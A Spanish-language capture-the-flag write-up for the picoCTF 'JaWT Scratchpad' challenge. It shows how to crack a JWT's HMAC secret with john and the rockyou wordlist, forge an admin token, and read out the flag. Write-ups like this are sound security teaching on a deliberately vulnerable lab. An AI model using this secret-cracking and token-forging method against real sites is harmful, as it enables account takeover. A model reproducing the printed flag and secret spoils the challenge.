# Descripción
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
Hints:
1. What is that cookie?
2. Have you heard of JWT?
# Solución
- creamos un archivo usando nano, en dicho archivo guardamos la cookie que obtenemos en la página al ingresar con cierto usuario
- Y usamos "cat hash" para verificar que el archivo se guardó correctamente
```
┌──(kali㉿kali)-[~/Documents]
└─$ nano hash
                                                                             
┌──(kali㉿kali)-[~/Documents]
└─$ cat hash    
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiJyBvciAxPT0xLS0ifQ.lvwBbyQsl4iD8MrooW8UiUgoWo97k9r4YKmY74UJNas
                                   
```
- Buscamos el archivo "rockyou.txt.gz" ya que ahí se gurdan las contraseñas que se han usado y desde ahí podemos encontrar la contraseña para el admin de la página
```
┌──(kali㉿kali)-[~]
└─$ sudo ls /usr/share/wordlists
amass      dnsmap.txt     john.lst    nmap.lst        wfuzz
dirb       fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt
```
- Descomprimimos el archivo y verificamos que se haya hecho
```
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
┌──(kali㉿kali)-[~]
└─$ sudo ls /usr/share/wordlists                    
amass      dnsmap.txt     john.lst    nmap.lst     wfuzz
dirb       fasttrack.txt  legion      rockyou.txt  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt

```
- Vemos las contraseñas usando head
```
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt   
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
- usamos john para encontrar que contraseña fue usada del archivo rockyou
```
-─(kali㉿kali)-[~/Documents]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:04 DONE (2025-03-29 16:01) 0.2132g/s 1577Kp/s 1577Kc/s 1577KC/s iloveqmc..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Entonces usamos la página https://jwt.io/ para poder modificar la firma de los tokens usando el token dado en la cookie, ahí ponemos como verificación la contraseña que obtuvimos con "john", también cambiamos el usuario para admin
- Copiamos el nuevo token que se nos da y lo pegamos en la cookie, recargamos y nos dará la bandera
```
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```
# Notas adicionales
# Referencias
- https://jwt.io/
- https://www.youtube.com/watch?v=iaKbvrbcSko&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=10